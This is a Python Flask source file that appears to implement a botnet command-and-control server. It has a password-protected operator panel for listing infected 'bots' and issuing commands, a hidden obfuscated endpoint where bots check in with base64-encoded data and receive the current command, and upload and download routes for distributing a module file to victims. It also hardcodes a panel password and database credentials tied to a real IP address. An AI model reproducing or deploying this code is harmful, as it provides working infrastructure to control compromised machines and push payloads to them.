import hashlib
import random
import os
import time
import base64
from flask import Flask
from flask import request
from flask import render_template
from flask import session
from flask import url_for
from flask import redirect
from werkzeug.utils import secure_filename
from Sql_module import SqlModule

app = Flask(__name__)


filename = 'newmodule.py'
password_main = 'solo0help'
app.secret_key = 'fknkajwhfjawfnawjfnawjfnwajfnawfajwkfnwjkfnawjy21fnjkwafkjfnawj2'
user_command = "None"
sess = ''

UPLOAD_FOLDER = './archive/'
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER

a = SqlModule("185.139.70.8", 'PanelFavorite', 'gjenjgnew23ad', 3306, 'basestart', 'users')

def decrypt(data):
    return base64.b64decode(data).decode('utf-8')


@app.route("/connect", methods=['POST', 'GET'])
def connect():
    if request.method == 'POST':
        if request.form.get('password') == password_main:
            global sess
            sess = request.form['password']
            sess=sess.encode('utf-8')
            session['login'] = sess
            return redirect(url_for('dashboard'))
        else:
            redirect(url_for('connect'))
    return render_template('connect.html')


@app.route("/dashboard", methods=["GET", "POST"])
def dashboard():
    if request.method == 'POST':
            logout = request.form.get('logout')
            if logout:
                session.pop('login', None)
                return redirect(url_for('connect'))
    if session.get('login') == sess:
        return render_template('dashboard.html')
    return redirect(url_for('connect'))


@app.route("/bots", methods=["GET", "POST"])
def bots():
    if session.get('login') == sess:
        all_bot = a.show_all_users()
        live_bot = len(a.show_users())
        count_all_bot = len(all_bot)
        return render_template('bots.html', my_list=all_bot, count_all=count_all_bot, count_live=live_bot)
    return redirect(url_for('connect'))


@app.route("/panel", methods=["GET", "POST"])
def panel():
    if session.get('login') == sess:
        send = request.form.get('command')
        history = SqlModule("185.139.70.8", 'PanelFavorite', 'gjenjgnew23ad', 3306, 'basestart', 'history')
        history.show_all_users()
        if send:
            global user_command
            user_command = str(send)
        return render_template('panel.html')
    return redirect(url_for('connect'))


@app.route("/jerkkawnfhdjawbdawjdnbawjdnawjdbhwadahwjdbaw", methods=["POST", "GET"])
def jerkkawnfhdjawbdawjdnbawjdnawjdbhwadahwjdbaw():
    if request.method == 'POST':
        ip_user = request.environ.get('HTTP_X_REAL_IP', request.remote_addr)

        data = request.get_json()
        if data is None:
            return user_command
        data = data.get('Params')
        if data:
            data = list(map(decrypt, data))
        data = [ip_user] + data + [time.strftime('%H:%M:%S'), 'online']
        print(data)
        a.add_user(data)
    return user_command


@app.route("/upload", methods=["POST", "GET"])
def upload():
    if session.get('login') == sess:

        if request.method == 'POST':
            file = request.files['file']
            file_name = secure_filename(file.filename)
            file.save(os.path.join(app.config['UPLOAD_FOLDER'], file_name))
        return render_template('upload_file.html')
    return redirect(url_for('connect'))


@app.route('/'+filename)
def download():
    return app.send_static_file(filename)


if __name__ == "__main__":
    app.run(debug=False)
